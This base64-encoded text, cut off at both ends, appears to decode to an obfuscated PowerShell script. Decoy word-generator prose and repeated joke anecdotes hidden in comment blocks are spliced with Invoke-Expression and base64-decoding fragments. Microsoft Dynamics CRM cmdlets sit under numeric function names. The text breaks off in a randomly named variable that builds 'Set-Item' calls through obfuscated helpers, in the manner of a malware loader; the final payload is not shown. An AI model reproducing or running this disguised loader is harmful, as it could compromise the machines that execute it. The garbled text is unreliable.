uIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGIoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBlKCkgc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gaCgpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBnKCkgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIDMwIHsKCVtDbWRsZXRCaW5kaW5nKCldCglQQVJBTSgKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEpXQogICAgICAgIFtzdHJpbmddJFNvbHV0aW9uTmFtZSwKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MildCgkJW1ZhbGlkYXRlUGF0dGVybignXig/OltcZF17MSx9XC4pezEsM31bXGRdezEsfSQnKV0KCQlbc3RyaW5nXSRWZXJzaW9uTnVtYmVyCgkpCgoJJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKQoKCSRzb2x1dGlvblJlY29yZHMgPSAoR2V0LUNybVJlY29yZHMgLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lIHNvbHV0aW9uIC1GaWx0ZXJBdHRyaWJ1dGUgdW5pcXVlbmFtZSAtRmlsdGVyT3BlcmF0b3IgImxpa2UiIC1GaWx0ZXJWYWx1ZSAkU29sdXRpb25OYW1lIC1GaWVsZHMgdW5pcXVlbmFtZSx2ZXJzaW9uICkKICAgICNpZiB3ZSBjYW4ndCBmaW5kIGp1c3Qgb25lIHNvbHV0aW9uIG1hdGNoaW5nIHRoZW4gRVJST1IKICAgIGlmKCRzb2x1dGlvblJlY29yZHMuQ3JtUmVjb3Jkcy5Db3VudCAtbmUgMSkKICAgIHsKICAgICAgICAkZnJpZW5kbHlOYW1lID0gJGNvbm4uQ29ubmVjdGVkT3JnRnJpZW5kbHlOYW1lLlRvU3RyaW5nKCkKICAgICAgICB0aHJvdyAiU29sdXRpb24gd2l0aCBuYW1lIGAiJFNvbHV0aW9uTmFtZWAiIGluIENSTSBJbnN0YW5jZTogYCIkZnJpZW5kbHlOYW1lYCIgbm90IGZvdW5kISIKICAgIH0KICAgICNlbHNlIFBST0NFRUQgCiAgICAKCSRjcm1Tb2x1dGlvblJlY29yZCA9ICRzb2x1dGlvblJlY29yZHMuQ3JtUmVjb3Jkc1swXQoJJG9sZFZlcnNpb24gPSAkY3JtU29sdXRpb25SZWNvcmQudmVyc2lvbgogICAgJGNybVNvbHV0aW9uUmVjb3JkLnZlcnNpb24gPSAkVmVyc2lvbk51bWJlcgoKCXRyeQogICAgewoJCVdyaXRlLVZlcmJvc2UgIlVwZGF0aW5nICQoJGNybVNvbHV0aW9uUmVjb3JkLnVuaXF1ZW5hbWUpIHZlcnNpb24gdG8gJFZlcnNpb25OdW1iZXIiCgkJU2V0LUNybVJlY29yZCAtY29ubiAkY29ubiAtQ3JtUmVjb3JkICRjcm1Tb2x1dGlvblJlY29yZAoKICAgICAgICBXcml0ZS1WZXJib3NlICJTdWNjZXNzZnVsbHkgdXBkYXRlZCBzb2x1dGlvbiByZWNvcmQiCiAgICAgICAgJHJlc3VsdCA9IE5ldy1PYmplY3QgcHNPYmplY3QKCiAgICAgICAgQWRkLU1lbWJlciAtSW5wdXRPYmplY3QgJHJlc3VsdCAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlByZXZpb3VzVmVyc2lvbk51bWJlciIgLVZhbHVlICRvbGRWZXJzaW9uCiAgICAgICAgQWRkLU1lbWJlciAtSW5wdXRPYmplY3QgJHJlc3VsdCAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIk5ld1ZlcnNpb25OdW1iZXIiIC1WYWx1ZSAkVmVyc2lvbk51bWJlcgogICAgfQogICAgY2F0Y2gKICAgIHsKICAgICAgICB0aHJvdyBMYXN0Q3JtQ29ubmVjdG9yRXhjZXB0aW9uKCRjb25uKQogICAgfQoKICAgICRyZXN1bHQKfQo8Iz4+ClNwPWVsbGluZyBhbmQgVm9jYWJ1bGFyeQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSB2b2NhYnVsYXJ5IG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIGcoKSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGIoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gMzF7CgogW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKCAKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIHBvc2l0aW9uPTEpXVtBbGlhcygiVXNlcklkIildCiAgICAgICAgW2d1aWRdJENhbGxlcklkCiAgICApCgoJJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKQoKICAgICRjb25uLkNhbGxlcklkID0gJENhbGxlcklkCn0KCiQ2QlFkVlhqMzZxeWVoYXh5NzlWZGhyN0dack5WN3BnYzJBQmpmTHg1alFoc0VuWkJjNyA9IEAiCiAkU2V0T2ZzVmFyQmFja1N5bnRheCAgPSAlKCkKICAgICRTZXRPZnNWYXJCYWNrU3ludGF4ICs9IChUM2k5dDVlSklCeG0xRE5ZRTNtZWZDNVMwaUVwMXVPMmYoJ1NldC1JdGVtJykpICsgKHQzSTlUNWVKSWJYTTFETnlFM21lZmM1czBpRXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5VDVlakl